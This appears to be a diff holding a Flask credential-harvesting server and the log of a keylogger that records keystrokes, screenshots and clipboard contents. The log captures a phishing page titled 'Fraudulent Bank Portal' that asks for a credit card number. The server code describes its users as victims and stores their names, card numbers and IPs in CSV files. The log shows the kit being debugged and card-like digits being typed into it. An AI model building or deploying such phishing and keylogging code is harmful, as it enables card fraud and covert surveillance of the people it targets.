+from flask import Flask, render_template, request, redirect, url_for
+import pandas as pd
+from datetime import datetime
+import uuid
+import logging
+
+# --- CONFIGURATION ---
+app = Flask(__name__)
+LOG_DIR = "Session_Logs"
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# Setup logging for internal server errors (separate from the session logs)
+logging.basicConfig(filename='server_errors.log', level=logging.ERROR, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+# --- CORE LOGIC ---
+def get_session_info(request):
+    """Extracts useful context from the incoming request."""
+    # IP Address is key for identifying the visitor location
+    visitor_ip = request.remote_addr 
+    # User Agent tells us what browser/device they are using
+    user_agent = request.headers.get('User-Agent', 'Unknown_Device')
+    return visitor_ip, user_agent
+
+@app.route('/')
+def index():
+    """The landing page where the victim enters data."""
+    # We pass nothing special here; the data is captured on POST submission
+    return render_template('index.html')
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    """The endpoint that receives the data and locks it into a session file."""
+
+    # 1. Capture User Input (The Keylogger/Clipboard input)
+    card_number = request.form.get('card_number')
+    name = request.form.get('name')
+
+    # 2. Capture Context (The Screenshot/Window data simulation)
+    # In a real scenario, this would be more complex, but User-Agent serves as the "context."
+    visitor_ip, user_agent = get_session_info(request)
+
+    # 3. Automatic Data Structuring & Session Identification
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    # Use a unique ID for tracking if the same person submits multiple times
+    session_id = str(uuid.uuid4())[:10] 
+
+    # 4. Final Logging/Saving Mechanism (The Evidence Vault)
+    log_filename = os.path.join(LOG_DIR, f"{session_id}_{timestamp}_session_log.csv")
+
+    # Data structure matches your desired evidence output
+    data_to_save = {
+        'SessionID': session_id,
+        'Timestamp': timestamp,
+        'VisitorIP': visitor_ip,
+        'CardNumber': card_number,
+        'Name': name,
+        'UserAgent': user_agent
+    }
+
+    # Use Pandas to write the structured data instantly
+    df = pd.DataFrame([data_to_save])
+    df.to_csv(log_filename, index=False)
+
+    print("=========================================================")
+    print(f"✅ SUCCESS: Session logged! File created: {log_filename}")
+    print(f"DATA CAPTURED: Name={name}, Card={card_number}, IP={visitor_ip}")
+    print("=========================================================")
+
+    # Redirect back to the index page to allow repeat submissions (or redirect to confirmation)
+    return redirect(url_for('index'))
+
+if __name__ == '__main__':
+    # Run the server on a specific port, accessible by clients
+    app.run(host='0.0.0.0', port=80, debug=True) '
+[2026-11-04 23:08:50] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:08:50] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:08:51] INFO: KEY_SPECIAL: space
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 's'
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:08:51] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:08:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:08:52] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:08:52] INFO: KEY_PRESS: '.'
+[2026-11-04 23:08:52] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:08:53] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:08:53] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:08:54] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:08:54] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:08:55] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:08:55] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:08:55] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:08:56] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:08:56] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:08:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230858.png
+[2026-11-04 23:09:10] INFO: CLIPBOARD_UPDATED: '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fraudulent Bank Portal</title>
+    <style>
+        /* Basic styling to make it look like a bank */
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
+        h1 { color: #333; text-align: center; }
+        label { display: block; margin-top: 15px; font-weight: bold; }
+        input[type="text"], input[type="tel"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #007bff; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; margin-top: 20px; width: 100%; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Secure Bank Login & Verification</h1>
+        <p>Please provide your details to verify your account for fraudulent activity:</p>
+
+        <!-- The form submits data directly to the server's /submit endpoint -->
+        <form action="/submit" method="POST">
+
+            <label for="name">Your Full Name:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="card_number">Credit Card Number (The Primary Target):</label>
+            <input type="tel" id="card_number" name="card_number" pattern="\d{13,16}" title="13 to 16 digits" required>
+
+            <button type="submit">Submit & Verify</button>
+        </form>
+
+        <hr>
+        <p style="text-align: center; font-size: small;">[Session ID: {{ session_info.session_id }} | View Context: {{ session_info.user_agent }}]</p>
+    </div>
+</body>
+</html>'
+[2026-11-04 23:09:13] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:09:13] INFO: KEY_PRESS: 'k'
+[2026-11-04 23:09:13] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:09:15] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:09:15] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:09:16] INFO: KEY_SPECIAL: space
+[2026-11-04 23:09:16] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:16] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:16] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:17] INFO: KEY_PRESS: 's'
+[2026-11-04 23:09:19] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:20] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:09:20] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:09:20] INFO: KEY_SPECIAL: space
+[2026-11-04 23:09:20] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:21] INFO: KEY_PRESS: 's'
+[2026-11-04 23:09:22] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:23] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:09:23] INFO: KEY_PRESS: 'a'
+[2026-11-04 23:09:23] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:09:23] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:09:24] INFO: KEY_SPECIAL: space
+[2026-11-04 23:09:24] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:09:24] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:09:24] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: '.'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:25] INFO: KEY_PRESS: 'm'
+[2026-11-04 23:09:26] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:09:26] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:27] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:09:27] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:09:28] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230928.png
+[2026-11-04 23:09:28] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:09:28] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:09:28] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:29] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:09:29] INFO: KEY_PRESS: 'x'
+[2026-11-04 23:09:42] INFO: CLIPBOARD_UPDATED: 'python server.py'
+[2026-11-04 23:09:47] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:09:47] INFO: KEY_PRESS: 'd'
+[2026-11-04 23:09:47] INFO: KEY_SPECIAL: space
+[2026-11-04 23:09:47] INFO: KEY_PRESS: '.'
+[2026-11-04 23:09:48] INFO: KEY_PRESS: '.'
+[2026-11-04 23:09:48] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:48] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:09:48] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:09:49] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:50] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:09:51] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:09:51] INFO: KEY_PRESS: 't'
+[2026-11-04 23:09:51] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:09:51] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: '3'
+[2026-11-04 23:09:52] INFO: KEY_SPECIAL: space
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 's'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:09:52] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:09:53] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:09:53] INFO: KEY_PRESS: '.'
+[2026-11-04 23:09:53] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:09:53] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:09:53] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:09:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_230958.png
+[2026-11-04 23:10:28] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231028.png
+[2026-11-04 23:10:55] INFO: CLIPBOARD_UPDATED: 'http://127.0.0.1:80/'
+[2026-11-04 23:10:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231058.png
+[2026-11-04 23:10:58] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:10:58] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:10:59] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:11:28] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231128.png
+[2026-11-04 23:11:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231158.png
+[2026-11-04 23:12:02] INFO: CLIPBOARD_UPDATED: 'python3 server.py
+ * Serving Flask app 'server'
+ * Debug mode: on
+Traceback (most recent call last):
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1536, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1514, in wsgi_app
+    response = self.handle_exception(e)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/Users/Robbie/projects/keys/server.py", line 30, in index
+    return render_template('index.html')
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/templating.py", line 151, in render_template
+    return _render(app, template, context)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/templating.py", line 132, in _render
+    rv = template.render(context)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/jinja2/environment.py", line 1295, in render
+    self.environment.handle_exception()
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/jinja2/environment.py", line 942, in handle_exception
+    raise rewrite_traceback_stack(source=source)
+  File "/Users/Robbie/projects/keys/templates/index.html", line 39, in top-level template code
+    <p style="text-align: center; font-size: small;">[Session ID: {{ session_info.session_id }} | View Context: {{
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/jinja2/environment.py", line 490, in getattr
+    return getattr(obj, attribute)
+jinja2.exceptions.UndefinedError: 'session_info' is undefined'
+[2026-11-04 23:12:28] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231228.png
+[2026-11-04 23:12:48] INFO: CLIPBOARD_UPDATED: '@app.route('/')
+def index():
+    # Pass the global session_data dictionary to the template
+    return render_template('index.html', session_info=session_data)'
+[2026-11-04 23:12:58] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231258.png
+[2026-11-04 23:13:03] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:13:04] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:13:14] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:13:14] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:13:15] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:13:15] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 't'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: '3'
+[2026-11-04 23:13:17] INFO: KEY_PRESS: '2'
+[2026-11-04 23:13:18] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:13:18] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:13:19] INFO: KEY_PRESS: '3'
+[2026-11-04 23:13:19] INFO: KEY_SPECIAL: space
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 's'
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:13:20] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:13:21] INFO: KEY_PRESS: '.'
+[2026-11-04 23:13:21] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:13:21] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:13:21] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:13:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231328.png
+[2026-11-04 23:13:59] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231359.png
+[2026-11-04 23:14:07] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:14:20] INFO: CLIPBOARD_UPDATED: 'NameError
+NameError: name 'session_data' is not defined
+
+Traceback (most recent call last)
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1536, in __call__
+return self.wsgi_app(environ, start_response)
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1514, in wsgi_app
+response = self.handle_exception(e)
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1511, in wsgi_app
+response = self.full_dispatch_request()
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 919, in full_dispatch_request
+rv = self.handle_user_exception(e)
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 917, in full_dispatch_request
+rv = self.dispatch_request()Open an interactive python shell in this frame
+File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 902, in dispatch_request
+return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+File "/Users/Robbie/projects/keys/server.py", line 29, in index
+return render_template('index.html', session_info=session_data)
+NameError: name 'session_data' is not defined
+The debugger caught an exception in your WSGI application. You can now look at the traceback which led to the error.
+To switch between the interactive traceback and the plaintext one, you can click on the "Traceback" headline. From the text traceback you can also create a paste of it. For code execution mouse-over the frame you want to debug and click on the console icon on the right side.
+
+You can execute arbitrary Python code in the stack frames and there are some extra helpers available for introspection:
+
+dump() shows all variables in the frame
+dump(obj) dumps all that's known about the object
+Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.'
+[2026-11-04 23:14:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231429.png
+[2026-11-04 23:14:35] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:14:35] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:14:49] INFO: CLIPBOARD_UPDATED: '<p style="text-align: center; font-size: small;">[Session ID: {{ session_info.session_id }} | View Context: {{ session_info.user_agent }}]</p>'
+[2026-11-04 23:14:56] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:14:56] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:14:59] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231459.png
+[2026-11-04 23:15:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231529.png
+[2026-11-04 23:15:59] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231559.png
+[2026-11-04 23:16:15] INFO: CLIPBOARD_UPDATED: '# --- CONFIGURATION ---
+app = Flask(__name__)
+LOG_DIR = "Session_Logs"
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# *** CRITICAL FIX: Define the state globally ***
+# Initialize the state container at the module level
+session_data = {} 
+# --- END FIX ---
+
+# Setup logging for internal server errors... (Keep this as is)
+
+# --- CORE LOGIC ---
+def get_session_info(request):
+    # ... (Function body remains the same)
+    visitor_ip = request.remote_addr 
+    user_agent = request.headers.get('User-Agent', 'Unknown_Device')
+    return visitor_ip, user_agent
+
+@app.route('/')
+def index():
+    # The global session_data is now immediately available here
+    return render_template('index.html', session_info=session_data)
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    global session_data # <-- IMPORTANT: Declare that this function intends to modify the global variable
+
+    # 1. Capture User Input
+    card_number = request.form.get('card_number')
+    name = request.form.get('name')
+
+    # 2. Capture Context
+    visitor_ip, user_agent = get_session_info(request)
+
+    # 3. Update Session Data
+    # Update the global structure with new data
+    session_data['submission_data']['card_number'] = card_number
+    session_data['submission_data']['name'] = name
+    session_data['submission_data']['user_agent'] = user_agent
+
+    # 4. Final Logging/Saving Mechanism
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    session_id = str(uuid.uuid4())[:10] 
+
+    # --- TEMPORARILY SAVE THE DATA IF WE DON'T WANT TO KEEP IT in memory ---
+    # (This ensures the data is saved even if the server crashes)
+    log_filename = os.path.join(LOG_DIR, f"{session_id}_{timestamp}_session_log.csv")
+
+    data_to_save = {
+        'SessionID': session_id,
+        'Timestamp': timestamp,
+        'VisitorIP': visitor_ip,
+        'CardNumber': card_number,
+        'Name': name,
+        'UserAgent': user_agent
+    }
+    df = pd.DataFrame([data_to_save])
+    df.to_csv(log_filename, index=False)
+
+    # --- Clean up the global in-memory state ---
+    # If you want the session_data to ONLY reflect the LATEST entry, clear it:
+    session_data = {} 
+
+    print("=========================================================")
+    print(f"✅ SUCCESS: Session logged! File created: {log_filename}")
+    print("=========================================================")
+
+    return redirect(url_for('index'))
+
+# ... (Rest of the __main__ block remains the same)'
+[2026-11-04 23:16:20] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:16:21] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:16:21] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:16:21] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:16:21] INFO: KEY_SPECIAL: up
+[2026-11-04 23:16:22] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:16:22] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:16:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231629.png
+[2026-11-04 23:16:42] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:16:42] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:16:43] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:16:58] INFO: KEY_SPECIAL: ctrl
+[2026-11-04 23:16:58] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:16:59] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231659.png
+[2026-11-04 23:17:00] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:17:00] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:00] INFO: KEY_PRESS: 'u'
+[2026-11-04 23:17:00] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:17:00] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:17:00] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:17:01] INFO: KEY_SPECIAL: backspace
+[2026-11-04 23:17:01] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:17:01] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:01] INFO: KEY_PRESS: 't'
+[2026-11-04 23:17:02] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:17:02] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:17:02] INFO: KEY_PRESS: 'n'
+[2026-11-04 23:17:02] INFO: KEY_PRESS: '3'
+[2026-11-04 23:17:02] INFO: KEY_SPECIAL: space
+[2026-11-04 23:17:05] INFO: KEY_PRESS: 's'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: '.'
+[2026-11-04 23:17:06] INFO: KEY_PRESS: 'p'
+[2026-11-04 23:17:07] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:07] INFO: KEY_SPECIAL: enter
+[2026-11-04 23:17:27] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 'R'
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 'o'
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 'b'
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 'r'
+[2026-11-04 23:17:27] INFO: KEY_PRESS: 't'
+[2026-11-04 23:17:28] INFO: KEY_SPECIAL: space
+[2026-11-04 23:17:28] INFO: KEY_SPECIAL: shift_r
+[2026-11-04 23:17:28] INFO: KEY_PRESS: 'M'
+[2026-11-04 23:17:28] INFO: KEY_PRESS: 'i'
+[2026-11-04 23:17:28] INFO: KEY_PRESS: 't'
+[2026-11-04 23:17:29] INFO: KEY_PRESS: 'c'
+[2026-11-04 23:17:29] INFO: KEY_PRESS: 'h'
+[2026-11-04 23:17:29] INFO: KEY_PRESS: 'e'
+[2026-11-04 23:17:29] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:17:29] INFO: KEY_PRESS: 'l'
+[2026-11-04 23:17:29] INFO: KEY_SPECIAL: tab
+[2026-11-04 23:17:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231729.png
+[2026-11-04 23:17:47] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:48] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:48] INFO: KEY_PRESS: '9'
+[2026-11-04 23:17:48] INFO: KEY_PRESS: '9'
+[2026-11-04 23:17:49] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:49] INFO: KEY_PRESS: '7'
+[2026-11-04 23:17:49] INFO: KEY_PRESS: '0'
+[2026-11-04 23:17:49] INFO: KEY_PRESS: '7'
+[2026-11-04 23:17:49] INFO: KEY_PRESS: '8'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '8'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '7'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '7'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '4'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: 'y'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: 't'
+[2026-11-04 23:17:50] INFO: KEY_PRESS: '4'
+[2026-11-04 23:17:55] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:55] INFO: KEY_PRESS: '5'
+[2026-11-04 23:17:55] INFO: KEY_PRESS: '9'
+[2026-11-04 23:17:55] INFO: KEY_PRESS: '9'
+[2026-11-04 23:17:56] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:56] INFO: KEY_PRESS: '4'
+[2026-11-04 23:17:56] INFO: KEY_PRESS: '0'
+[2026-11-04 23:17:56] INFO: KEY_PRESS: '4'
+[2026-11-04 23:17:57] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:57] INFO: KEY_PRESS: '7'
+[2026-11-04 23:17:57] INFO: KEY_PRESS: '6'
+[2026-11-04 23:17:58] INFO: KEY_PRESS: '2'
+[2026-11-04 23:17:58] INFO: KEY_PRESS: '3'
+[2026-11-04 23:17:58] INFO: KEY_PRESS: '9'
+[2026-11-04 23:17:58] INFO: KEY_PRESS: '3'
+[2026-11-04 23:17:58] INFO: KEY_PRESS: '8'
+[2026-11-04 23:17:59] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231759.png
+[2026-11-04 23:18:21] INFO: CLIPBOARD_UPDATED: ' * Running on http://127.0.0.1:80
+ * Running on http://10.0.0.157:80
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 558-221-979
+127.0.0.1 - - [04/Nov/2026 23:17:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [04/Nov/2026 23:17:24] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [04/Nov/2026 23:17:59] "POST /submit HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1536, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1514, in wsgi_app
+    response = self.handle_exception(e)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/Users/Robbie/Library/Python/3.9/lib/python/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/Users/Robbie/projects/keys/server.py", line 46, in submit_form
+    session_data['submission_data']['card_number'] = card_number
+KeyError: 'submission_data'
+127.0.0.1 - - [04/Nov/2026 23:18:00] "GET /submit?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+127.0.0.1 - - [04/Nov/2026 23:18:00] "GET /submit?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+127.0.0.1 - - [04/Nov/2026 23:18:00] "GET /submit?__debugger__=yes&cmd=resource&f=console.png&s=k1OenpTz0gtpxNEOs7kF HTTP/1.1" 200 -
+127.0.0.1 - - [04/Nov/2026 23:18:00] "GET /submit?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -'
+[2026-11-04 23:18:29] INFO: SCREENSHOT_TAKEN: Image saved as capture_20261104_231829.png
+[2026-11-04 23:18:30] INFO: KEY_SPECIAL: cmd
+[2026-11-04 23:18:30] INFO: KEY_PRESS: 'v'
+[2026-11-04 23:18:31] INFO: KEY_SPECIAL: enter
